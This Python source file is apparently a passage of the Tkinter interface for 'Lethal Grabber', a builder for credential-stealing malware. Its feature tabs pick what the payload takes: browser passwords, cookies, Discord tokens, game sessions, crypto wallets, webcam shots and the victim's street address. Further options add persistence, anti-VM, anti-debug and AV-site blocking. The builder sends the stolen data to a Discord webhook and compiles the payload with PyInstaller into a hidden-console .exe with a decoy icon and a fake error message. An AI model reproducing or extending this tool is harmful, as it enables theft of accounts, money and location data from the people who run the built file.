        
        status_inner = tk.Frame(bottom_bar, bg='#0d0d18')
        status_inner.pack(fill='x', padx=15, pady=5)
        
        tk.Label(status_inner, text="\u25cf", font=('Segoe UI', 7), fg=self.GREEN, 
                bg='#0d0d18').pack(side='left')
        tk.Label(status_inner, text="  Status: ", font=('Segoe UI', 8), 
                fg=self.TEXT_DIM, bg='#0d0d18').pack(side='left')
        tk.Label(status_inner, textvariable=self.build_status, font=('Segoe UI', 8),
                fg=self.TEXT_SEC, bg='#0d0d18').pack(side='left')
        
        self.build_btn = tk.Button(
            status_inner, text="\u26a1 BUILD .EXE \u26a1", 
            command=self.start_build,
            font=('Segoe UI', 9, 'bold'),
            fg='white', bg=self.ACCENT,
            activebackground=self.BTN_HOVER,
            activeforeground='white',
            relief='flat', bd=0, padx=18, pady=3, cursor='hand2'
        )
        self.build_btn.pack(side='right')
    
    def _make_card(self, parent, title, icon, accent_color=None):
        if accent_color is None:
            accent_color = self.ACCENT
        
        card = tk.Frame(parent, bg=self.CARD_BG, 
                       highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        card.pack(fill='x', padx=15, pady=(8, 6))
        
        tk.Frame(card, bg=accent_color, height=2).pack(fill='x')
        
        hdr = tk.Frame(card, bg=self.CARD_BG)
        hdr.pack(fill='x', padx=14, pady=(8, 4))
        tk.Label(hdr, text=icon, font=('Segoe UI', 11), fg=self.ACCENT_GLOW, 
                bg=self.CARD_BG).pack(side='left')
        tk.Label(hdr, text=f"  {title}", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        
        content = tk.Frame(card, bg=self.CARD_BG)
        content.pack(fill='x', padx=14, pady=(0, 10))
        
        return content
    
    def _make_feature_chk(self, parent, text, var, row, col, padx=5, pady=2):
        cb = tk.Checkbutton(
            parent, text=text, variable=var,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0,
            padx=2, pady=1
        )
        cb.grid(row=row, column=col, sticky='w', padx=padx, pady=pady)
        return cb
    
    def _build_features_tab(self):
        frame = tk.Frame(self.content_area, bg=self.BG)
        
        canvas = tk.Canvas(frame, bg=self.BG, highlightthickness=0, bd=0)
        scrollbar = tk.Scrollbar(frame, orient='vertical', command=canvas.yview)
        scroll_frame = tk.Frame(canvas, bg=self.BG)
        
        scroll_frame.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0, 0), window=scroll_frame, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        row1 = tk.Frame(scroll_frame, bg=self.BG)
        row1.pack(fill='x', pady=(10, 0))
        
        games_c = tk.Frame(row1, bg=self.CARD_BG, 
                          highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        games_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(games_c, bg=self.ACCENT, height=2).pack(fill='x')
        games_hdr = tk.Frame(games_c, bg=self.CARD_BG)
        games_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(games_hdr, text="\U0001f3ae  Games", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        games_b = tk.Frame(games_c, bg=self.CARD_BG)
        games_b.pack(fill='x', padx=12, pady=(0, 8))
        
        self._make_feature_chk(games_b, "Roblox Cookie Stealer", self.features["roblox"], 0, 0)
        self._make_feature_chk(games_b, "Minecraft Session Stealer", self.features["minecraft"], 1, 0)
        
        err_c = tk.Frame(row1, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        err_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(err_c, bg=self.ACCENT, height=2).pack(fill='x')
        err_hdr = tk.Frame(err_c, bg=self.CARD_BG)
        err_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(err_hdr, text="\u26a0\ufe0f  Error Display", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        err_b = tk.Frame(err_c, bg=self.CARD_BG)
        err_b.pack(fill='x', padx=12, pady=(0, 8))
        
        cb_err = tk.Checkbutton(
            err_b, text="Show error message when run", variable=self.show_error,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        )
        cb_err.grid(row=0, column=0, columnspan=2, sticky='w', pady=1)
        
        tk.Label(err_b, text="Title", font=('Segoe UI', 7), fg=self.TEXT_DIM, 
                bg=self.CARD_BG).grid(row=1, column=0, sticky='w', pady=(4, 1))
        tk.Entry(err_b, textvariable=self.error_title, font=('Segoe UI', 8),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0, width=18).grid(row=1, column=1, sticky='ew', padx=(4, 0), pady=(4, 1))
        
        tk.Label(err_b, text="Content", font=('Segoe UI', 7), fg=self.TEXT_DIM, 
                bg=self.CARD_BG).grid(row=2, column=0, sticky='w', pady=(1, 1))
        tk.Entry(err_b, textvariable=self.error_content, font=('Segoe UI', 8),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0, width=24).grid(row=2, column=1, sticky='ew', padx=(4, 0), pady=(1, 1))
        
        row2 = tk.Frame(scroll_frame, bg=self.BG)
        row2.pack(fill='x', pady=(4, 0))
        
        gen_c = tk.Frame(row2, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        gen_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(gen_c, bg=self.ACCENT, height=2).pack(fill='x')
        gen_hdr = tk.Frame(gen_c, bg=self.CARD_BG)
        gen_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(gen_hdr, text="\U0001f4cb  General", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        gen_b = tk.Frame(gen_c, bg=self.CARD_BG)
        gen_b.pack(fill='x', padx=12, pady=(0, 8))
        
        gen_items = ["passwords", "autofills", "cookies", "tokens", "winkey", "screenshot", "messenger"]
        gen_labels = ["Passwords", "Autofills", "Cookies", "Discord Tokens", "Windows Key", "Screenshot", "Messenger"]
        for i, (k, lbl) in enumerate(zip(gen_items, gen_labels)):
            self._make_feature_chk(gen_b, lbl, self.features[k], i//2, i%2, padx=8)
        
        opt_c = tk.Frame(row2, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        opt_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(opt_c, bg=self.ACCENT, height=2).pack(fill='x')
        opt_hdr = tk.Frame(opt_c, bg=self.CARD_BG)
        opt_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(opt_hdr, text="\U0001f527  Options", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        opt_b = tk.Frame(opt_c, bg=self.CARD_BG)
        opt_b.pack(fill='x', padx=12, pady=(0, 8))
        
        opt_items = [
            (self.hide_console, "Hide Console"),
            (self.add_to_startup_opt, "Add to Startup"),
            (self.block_av_sites, "Block AV Sites"),
            (self.grab_crypto_wallets, "Grab Crypto Wallets"),
            (self.capture_webcam, "Capture Webcam"),
            (self.ping_everyone, "Ping @everyone"),
        ]
        for i, (var, lbl) in enumerate(opt_items):
            tk.Checkbutton(
                opt_b, text=lbl, variable=var,
                font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
                selectcolor='#1a1a3a', activebackground=self.CARD_BG,
                activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
            ).grid(row=i//2, column=i%2, sticky='w', padx=8, pady=1)
        
        row3 = tk.Frame(scroll_frame, bg=self.BG)
        row3.pack(fill='x', pady=(4, 0))

        addr_c = tk.Frame(row3, bg=self.CARD_BG, 
                         highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        addr_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(addr_c, bg=self.ACCENT, height=2).pack(fill='x')
        addr_hdr = tk.Frame(addr_c, bg=self.CARD_BG)
        addr_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(addr_hdr, text="\U0001f4cd  Location Intelligence", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        addr_b = tk.Frame(addr_c, bg=self.CARD_BG)
        addr_b.pack(fill='x', padx=12, pady=(0, 8))
        
        tk.Checkbutton(
            addr_b, text="Street Address Grabber (via Selenium browser)",
            variable=self.grab_address,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        ).pack(anchor='w', pady=2)
        
        tk.Label(addr_b, 
                text="Uses hidden browser to silently retrieve\nthe target's street address via geolocation",
                font=('Segoe UI', 7), fg=self.TEXT_DIM, bg=self.CARD_BG,
                justify='left').pack(anchor='w', pady=(0, 2))

        sys_c = tk.Frame(row3, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        sys_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(sys_c, bg=self.ACCENT_DIM, height=2).pack(fill='x')
        sys_hdr = tk.Frame(sys_c, bg=self.CARD_BG)
        sys_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(sys_hdr, text="\U0001f5a5\ufe0f  System & Misc", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        sys_b = tk.Frame(sys_c, bg=self.CARD_BG)
        sys_b.pack(fill='x', padx=12, pady=(0, 8))
        
        sys_items = [("system", "System Info"), ("persistence", "Persistence"), ("selfdestruct", "Self-Destruct")]
        for i, (k, lbl) in enumerate(sys_items):
            tk.Checkbutton(
                sys_b, text=lbl, variable=self.features[k],
                font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
                selectcolor='#1a1a3a', activebackground=self.CARD_BG,
                activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
            ).grid(row=0, column=i, sticky='w', padx=12, pady=1)
        
        return frame
    
    def _build_setup_tab(self):
        frame = tk.Frame(self.content_area, bg=self.BG)
        
        canvas = tk.Canvas(frame, bg=self.BG, highlightthickness=0, bd=0)
        scrollbar = tk.Scrollbar(frame, orient='vertical', command=canvas.yview)
        scroll_frame = tk.Frame(canvas, bg=self.BG)
        
        scroll_frame.bind('<Configure>', lambda e: canvas.configure(scrollregion=canvas.bbox('all')))
        canvas.create_window((0, 0), window=scroll_frame, anchor='nw')
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side='left', fill='both', expand=True)
        scrollbar.pack(side='right', fill='y')
        
        wh_content = self._make_card(scroll_frame, "Webhook Configuration", "\U0001f517")
        
        tk.Label(wh_content, text="Discord Webhook URL", font=('Segoe UI', 8), 
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        tk.Entry(wh_content, textvariable=self.webhook_url, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(fill='x', ipady=4, pady=(0, 5))
        
        wh_row = tk.Frame(wh_content, bg=self.CARD_BG)
        wh_row.pack(fill='x')
        
        left = tk.Frame(wh_row, bg=self.CARD_BG)
        left.pack(side='left', fill='x', expand=True, padx=(0, 6))
        tk.Label(left, text="Bot Name", font=('Segoe UI', 8), fg=self.TEXT_DIM, 
                bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        tk.Entry(left, textvariable=self.webhook_name, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(fill='x', ipady=4)
        
        right = tk.Frame(wh_row, bg=self.CARD_BG)
        right.pack(side='left', fill='x', expand=True)
        tk.Label(right, text="Avatar URL (optional)", font=('Segoe UI', 8), 
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        tk.Entry(right, textvariable=self.webhook_avatar, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(fill='x', ipady=4)
        
        icon_exe_row = tk.Frame(scroll_frame, bg=self.BG)
        icon_exe_row.pack(fill='x', pady=(4, 0))
        
        icon_c = tk.Frame(icon_exe_row, bg=self.CARD_BG, 
                         highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        icon_c.pack(side='left', fill='both', expand=True, padx=(15, 7))
        tk.Frame(icon_c, bg=self.ACCENT, height=2).pack(fill='x')
        icon_hdr = tk.Frame(icon_c, bg=self.CARD_BG)
        icon_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(icon_hdr, text="\U0001f5bc\ufe0f  Custom Icon", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        icon_b = tk.Frame(icon_c, bg=self.CARD_BG)
        icon_b.pack(fill='x', padx=12, pady=(0, 8))
        
        icon_input_frame = tk.Frame(icon_b, bg=self.CARD_BG)
        icon_input_frame.pack(fill='x')
        tk.Entry(icon_input_frame, textvariable=self.exe_icon_path, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(side='left', fill='x', expand=True, ipady=3)
        tk.Button(icon_input_frame, text="Browse", 
                 font=('Segoe UI', 8), fg='white', bg=self.ACCENT_DIM,
                 activebackground=self.ACCENT, relief='flat', bd=0, padx=10, pady=2,
                 cursor='hand2', command=self._browse_icon).pack(side='right', padx=(5, 0))
        
        preview_frame = tk.Frame(icon_b, bg='#0a0a15', width=40, height=40,
                                highlightbackground=self.ENTRY_BORDER, highlightthickness=1)
        preview_frame.pack(side='right', pady=(5, 0))
        preview_frame.pack_propagate(False)
        self.icon_preview_label = tk.Label(preview_frame, text="No\nIcon", font=('Segoe UI', 6),
                                           fg=self.TEXT_DIM, bg='#0a0a15')
        self.icon_preview_label.pack(expand=True)
        
        out_c = tk.Frame(icon_exe_row, bg=self.CARD_BG, 
                        highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        out_c.pack(side='left', fill='both', expand=True, padx=(7, 15))
        tk.Frame(out_c, bg=self.ACCENT, height=2).pack(fill='x')
        out_hdr = tk.Frame(out_c, bg=self.CARD_BG)
        out_hdr.pack(fill='x', padx=12, pady=(6, 2))
        tk.Label(out_hdr, text="\U0001f4e6  Output Settings", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        out_b = tk.Frame(out_c, bg=self.CARD_BG)
        out_b.pack(fill='x', padx=12, pady=(0, 8))
        
        tk.Label(out_b, text="EXE Output Name", font=('Segoe UI', 8),
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(anchor='w', pady=(2, 2))
        exe_inner = tk.Frame(out_b, bg=self.CARD_BG)
        exe_inner.pack(fill='x')
        tk.Entry(exe_inner, textvariable=self.exe_name, font=('Segoe UI', 9),
                bg=self.ENTRY_BG, fg='white', insertbackground='white', 
                relief='flat', bd=0).pack(side='left', fill='x', expand=True, ipady=3)
        tk.Label(exe_inner, text=".exe", font=('Segoe UI', 9, 'bold'),
                fg=self.TEXT_DIM, bg=self.CARD_BG).pack(side='left', padx=(5, 0))
        
        exec_content = self._make_card(scroll_frame, "Execution Options", "\U0001f6e1\ufe0f")
        exec_grid = tk.Frame(exec_content, bg=self.CARD_BG)
        exec_grid.pack()
        
        tk.Checkbutton(
            exec_grid, text="Anti-VM", variable=self.anti_vm,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        ).grid(row=0, column=0, sticky='w', padx=15, pady=2)
        
        tk.Checkbutton(
            exec_grid, text="Anti-Debug", variable=self.anti_debug,
            font=('Segoe UI', 9), fg=self.TEXT, bg=self.CARD_BG,
            selectcolor='#1a1a3a', activebackground=self.CARD_BG,
            activeforeground=self.ACCENT_GLOW, highlightthickness=0, bd=0
        ).grid(row=0, column=1, sticky='w', padx=15, pady=2)
        
        return frame
    
    def _build_compiler_tab(self):
        frame = tk.Frame(self.content_area, bg=self.BG)
        
        info_log_row = tk.Frame(frame, bg=self.BG)
        info_log_row.pack(fill='both', expand=True, padx=0, pady=0)
        
        info_card = tk.Frame(info_log_row, bg=self.CARD_BG, 
                            highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        info_card.pack(side='left', fill='both', expand=False, padx=(15, 7), pady=12)
        tk.Frame(info_card, bg=self.ACCENT, height=2).pack(fill='x')
        
        info_hdr = tk.Frame(info_card, bg=self.CARD_BG)
        info_hdr.pack(fill='x', padx=12, pady=(8, 5))
        tk.Label(info_hdr, text="\U0001f4cb  Build Info", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        
        info_b = tk.Frame(info_card, bg=self.CARD_BG)
        info_b.pack(fill='x', padx=12, pady=(0, 10))
        
        info_lines = [
            ("Output:", "dist/<name>.exe"),
            ("Compiler:", "PyInstaller"),
            ("Python:", f"{sys.version.split()[0]}"),
            ("Platform:", f"{platform.system()}"),
            ("Arch:", platform.machine()),
        ]
        for label, value in info_lines:
            row = tk.Frame(info_b, bg=self.CARD_BG)
            row.pack(fill='x', pady=1)
            tk.Label(row, text=label, font=('Segoe UI', 8, 'bold'), fg=self.TEXT_DIM,
                    bg=self.CARD_BG, width=8, anchor='w').pack(side='left')
            tk.Label(row, text=value, font=('Segoe UI', 8), fg=self.TEXT_SEC,
                    bg=self.CARD_BG, anchor='w').pack(side='left', fill='x', expand=True)
        
        log_card = tk.Frame(info_log_row, bg=self.CARD_BG, 
                           highlightbackground=self.CARD_BORDER, highlightthickness=1, bd=0)
        log_card.pack(side='left', fill='both', expand=True, padx=(7, 15), pady=12)
        tk.Frame(log_card, bg=self.ACCENT, height=2).pack(fill='x')
        
        log_hdr = tk.Frame(log_card, bg=self.CARD_BG)
        log_hdr.pack(fill='x', padx=12, pady=(8, 4))
        tk.Label(log_hdr, text="\U0001f4dd  Build Log", font=('Segoe UI', 10, 'bold'),
                fg='white', bg=self.CARD_BG).pack(side='left')
        
        tk.Button(log_hdr, text="Clear", command=self.clear_log,
                 font=('Segoe UI', 7), fg=self.TEXT_DIM, bg='#1a1a35',
                 activebackground=self.ENTRY_BG, relief='flat', bd=0, padx=8, pady=2,
                 cursor='hand2').pack(side='right')
        
        log_container = tk.Frame(log_card, bg='#050510')
        log_container.pack(fill='both', expand=True, padx=12, pady=(0, 10))
        
        self.log_text = tk.Text(log_container, font=('Consolas', 9), bg='#050510', 
                               fg=self.ACCENT_GLOW, relief='flat', bd=0, 
                               insertbackground='white', state='disabled', 
                               wrap='word', height=8)
        self.log_text.pack(side='left', fill='both', expand=True)
        
        sb = tk.Scrollbar(log_container, command=self.log_text.yview, 
                          bg='#1a1a35', troughcolor='#0a0a15')
        sb.pack(side='right', fill='y')
        self.log_text.config(yscrollcommand=sb.set)
        
        return frame
    
    def _switch_tab(self, tab_name):
        self.current_tab.set(tab_name)
        
        for name, frame in self.tab_frames.items():
            frame.pack_forget()
        
        if tab_name in self.tab_frames:
            self.tab_frames[tab_name].pack(fill='both', expand=True)
        
        for key, btn in self.nav_btns.items():
            if key == tab_name:
                btn.configure(fg='white', bg='#1a1a35')
            else:
                btn.configure(fg=self.TEXT_DIM, bg=self.SIDEBAR_BG)
    
    def _browse_icon(self):
        path = filedialog.askopenfilename(
            title="Select Icon File",
            filetypes=[("Icon files", "*.ico"), ("All files", "*.*")]
        )
        if path:
            self.exe_icon_path.set(path)
            try:
                img = Image.open(path)
                img = img.resize((32, 32), Image.LANCZOS)
                photo = ImageTk.PhotoImage(img)
                self.icon_preview_label.configure(image=photo, text="")
                self.icon_preview_label.image = photo
            except:
                self.icon_preview_label.configure(text="Err", image="")
    
    def _start_led_animation(self):
        colors = [
            (124, 58, 237),
            (167, 139, 250),
            (192, 132, 252),
            (139, 92, 246),
            (124, 58, 237),
        ]
        
        def animate():
            width = self.led_canvas.winfo_width() or 1100
            self.led_canvas.delete('all')
            phase = self.led_phase % width
            
            for x in range(0, width, 2):
                pos = (x + phase) % width
                ratio = pos / width
                n = len(colors) - 1
                seg_pos = ratio * n
                seg_idx = int(seg_pos)
                seg_frac = seg_pos - seg_idx
                if seg_idx >= n:
                    seg_idx = n - 1
                    seg_frac = 1.0
                c1 = colors[seg_idx]
                c2 = colors[seg_idx + 1]
                r = int(c1[0] * (1 - seg_frac) + c2[0] * seg_frac)
                g = int(c1[1] * (1 - seg_frac) + c2[1] * seg_frac)
                b = int(c1[2] * (1 - seg_frac) + c2[2] * seg_frac)
                color_hex = f'#{r:02x}{g:02x}{b:02x}'
                self.led_canvas.create_line(x, 0, x, self.LED_STRIP_H, fill=color_hex, width=2)
            
            self.led_phase = (self.led_phase + 3) % width
            self.root.after(50, animate)
        
        self.root.after(200, animate)
    
    def clear_log(self):
        self.log_text.config(state='normal')
        self.log_text.delete('1.0', 'end')
        self.log_text.config(state='disabled')
    
    def log_message(self, message, level="INFO"):
        timestamp = datetime.now().strftime('%H:%M:%S')
        colors = {"INFO": "#a78bfa", "WARN": "#eab308", "ERROR": "#ef4444", "SUCCESS": "#22c55e"}
        level_tag = f"level_{level}"
        
        self.log_text.config(state='normal')
        self.log_text.insert('end', f"[{timestamp}] ", "timestamp")
        self.log_text.insert('end', f"[{level}] ", level_tag)
        self.log_text.insert('end', f"{message}\n")
        self.log_text.see('end')
        self.log_text.config(state='disabled')
        self.root.update()
    
    def start_build(self):
        if self.is_building:
            return
        
        url = self.webhook_url.get().strip()
        if not url:
            messagebox.showerror("Error", "Webhook URL is required!")
            return
        if not url.startswith('https://discord.com/api/webhooks/'):
            messagebox.showerror("Error", "Invalid Discord webhook URL!")
            return
        
        self.is_building = True
        self.build_btn.config(state='disabled', text='\u23f3 BUILDING...', bg='#6b7280')
        self.build_status.set("Building...")
        
        thread = threading.Thread(target=self._build_process, daemon=True)
        thread.start()
    
    def _build_process(self):
        try:
            self.log_message("Starting build process...", "INFO")
            self.log_message(f"Webhook: {self.webhook_url.get()[:50]}...", "INFO")
            exe_name = self.exe_name.get().strip() or "LethalGrabber"
            self.log_message(f"EXE Name: {exe_name}.exe", "INFO")
            
            feat_dict = {k: v.get() for k, v in self.features.items()}
            feat_dict["show_error"] = self.show_error.get()
            feat_dict["error_title"] = self.error_title.get()
            feat_dict["error_content"] = self.error_content.get()
            
            source = generate_grabber_source(
                self.webhook_url.get().strip(),
                self.webhook_name.get().strip() or "Lethal Grabber",
                self.webhook_avatar.get().strip(),
                feat_dict,
                ping_everyone=self.ping_everyone.get(),
                block_av_sites=self.block_av_sites.get(),
                grab_crypto=self.grab_crypto_wallets.get(),
                webcam_capture=self.capture_webcam.get(),
                grab_address=self.grab_address.get()
            )
            
            script_dir = os.path.dirname(os.path.abspath(__file__))
            temp_py = os.path.join(script_dir, f"_temp_{exe_name}.py")
            
            with open(temp_py, 'w', encoding='utf-8') as f:
                f.write(source)
            self.log_message(f"Temp script written: {os.path.basename(temp_py)}", "INFO")
            
            dist_dir = os.path.join(script_dir, "dist")
            build_dir = os.path.join(script_dir, "build")
            spec_dir = os.path.join(script_dir, "temp_spec")
            os.makedirs(dist_dir, exist_ok=True)
            os.makedirs(build_dir, exist_ok=True)
            os.makedirs(spec_dir, exist_ok=True)
            
            cmd = [
                sys.executable, '-m', 'PyInstaller',
                '--onefile',
                '--noconsole',
                f'--name={exe_name}',
                f'--distpath={dist_dir}',
                f'--workpath={build_dir}',
                f'--specpath={spec_dir}',
                '--hidden-import=win32crypt',
                '--hidden-import=Crypto',
                '--hidden-import=Crypto.Cipher',
                '--hidden-import=requests',
                '--hidden-import=PIL',
                '--hidden-import=PIL.ImageGrab',
                '--hidden-import=sqlite3',
                '--hidden-import=zipfile',
                '--hidden-import=io',
                '--hidden-import=cv2',
                '--noconfirm',
                temp_py
            ]
            
            icon_path = self.exe_icon_path.get().strip()
            if icon_path and os.path.exists(icon_path):
                cmd.insert(3, f'--icon={icon_path}')
                self.log_message(f"Icon: {icon_path}", "INFO")
            
            self.log_message("Running PyInstaller...", "INFO")
            self.build_status.set("Compiling... (this may take a minute)")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == 'win32' else 0
            )
            
            for line in process.stdout:
                line = line.strip()
                if line:
                    lower = line.lower()
                    if any(kw in lower for kw in ['error', 'fail', 'exception']):
                        self.log_message(line[:200], "ERROR")
                    elif any(kw in lower for kw in ['warn']):
                        self.log_message(line[:200], "WARN")
                    elif any(kw in lower for kw in ['complete', 'done', 'success']):
                        self.log_message(line[:200], "SUCCESS")
                    elif any(kw in lower for kw in ['building', 'loading', 'analyzing', 'looking']):
                        self.log_message(line[:200], "INFO")
            
            process.wait()
            
            exe_path = os.path.join(dist_dir, f"{exe_name}.exe")
            
            if os.path.exists(exe_path):
                size_mb = os.path.getsize(exe_path) / (1024 * 1024)
                self.log_message(f"Build successful!", "SUCCESS")
                self.log_message(f"Output: {exe_path}", "SUCCESS")
                self.log_message(f"Size: {size_mb:.2f} MB", "SUCCESS")
                self.build_status.set(f"Built: {exe_name}.exe ({size_mb:.1f} MB)")
                messagebox.showinfo("Build Complete", 
                    f"Successfully built {exe_name}.exe\n\nLocation: {exe_path}\nSize: {size_mb:.2f} MB")
            else:
                self.log_message("BUILD FAILED - .exe not found in dist/", "ERROR")
                self.build_status.set("Build failed - check log")
                messagebox.showerror("Build Failed", "The .exe was not created. Check the build log for details.")
            
            self.log_message("Cleaning up build artifacts...", "INFO")
            
            if os.path.exists(temp_py):
                os.remove(temp_py)
            
            for d in [build_dir, spec_dir]:
                if os.path.exists(d):
                    try: shutil.rmtree(d)
                    except: pass
            
            for f in os.listdir(script_dir):
                if f.endswith('.spec') and f.startswith('_temp_'):
                    try: os.remove(os.path.join(script_dir, f))
                    except: pass
            
            self.log_message("Build process complete!", "SUCCESS")
            
        except Exception as e:
            self.log_message(f"Build error: {str(e)}", "ERROR")
            self.build_status.set(f"Error: {str(e)[:50]}")
        finally:
            self.is_building = False
            self.root.after(0, lambda: self.build_btn.config(
                state='normal', text='\u26a1 BUILD .EXE \u26a1', bg=self.ACCENT
            ))


if __name__ == '__main__':
    root = tk.Tk()
    app = SleekBuilder(root)
    root.mainloop()